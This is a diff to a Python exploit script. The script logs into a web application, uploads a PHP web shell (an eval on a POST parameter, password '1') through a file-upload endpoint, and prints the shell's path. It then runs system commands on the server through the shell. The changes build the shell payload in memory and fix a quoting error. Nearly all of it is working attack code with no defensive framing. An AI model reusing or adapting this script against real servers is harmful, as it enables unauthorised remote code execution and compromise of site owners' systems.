@@ -1,5 +1,6 @@
 import requests
-open('1.php', 'w').write(r'<?php eval($_POST["1"]);?>')
+# open('1.php', 'w').write(r'<?php eval($_POST["1"]);?>')
+shell = r'<?php eval($_POST["1"]);?>'
 
 session = requests.session()
 
@@ -20,7 +21,8 @@ data1 = {
 
 
 r = session.post(url1, data=data1)
-r = session.post(url2, files={'file': open('1.php', 'r+')})
+# r = session.post(url2, files={'file': open('1.php', 'r+')})
+r = session.post(url2, files={'file': ['2.php', shell]})
 
 filepath = str(r.json()['filepath'])
 filepath = "/" + filepath.split('.uptemp')[0] + '.php'
@@ -32,5 +34,5 @@ r = session.get(url3)
 print('shell path: ', url_pre + filepath)
 print('password: 1')
 # r = session.get(url_pre + filepath + "?1=system('dir');")
-r = session.post(url_pre + filepath, data={'1': 'system('dir');'})
+r = session.post(url_pre + filepath, data={'1': 'system("dir");'})
 print(r.text)
